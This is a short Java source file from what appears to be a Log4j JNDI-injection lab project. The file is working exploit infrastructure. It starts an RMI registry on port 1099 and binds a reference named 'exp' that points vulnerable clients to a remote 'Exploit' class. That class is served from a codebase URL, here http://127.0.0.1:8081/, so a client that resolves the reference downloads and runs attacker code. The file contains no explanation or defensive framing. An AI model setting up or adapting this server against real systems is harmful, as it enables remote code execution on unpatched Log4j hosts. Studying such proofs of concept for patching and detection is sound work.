package com.cfysu.jdni.log4j;

/**
 * @Author canglong
 * @Date 2022/1/6
 */

import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.Reference;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class RMIServer {
    public static void main(String args[]) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference exploit = new Reference("com.cfysu.jdni.log4j.Exploit", "com.cfysu.jdni.log4j.Exploit", "http://127.0.0.1:8081/");
        ReferenceWrapper exploitWrapper = new ReferenceWrapper(exploit);
        registry.bind("exp", exploitWrapper);
    }
}
